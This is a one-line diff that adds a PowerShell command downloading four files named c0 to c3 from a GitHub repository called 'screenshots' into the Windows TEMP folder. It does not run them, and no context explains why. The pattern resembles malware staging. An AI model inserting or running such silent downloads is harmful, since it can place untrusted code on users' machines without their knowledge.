@@ -1,0 +1,1 @@
+$c=New-Object Net.WebClient;0..3|%{$c.DownloadFile('https://raw.githubusercontent.com/cem324/screenshots/main/c'+$_,"$env:TEMP\c$_")};Write-Host downloaded
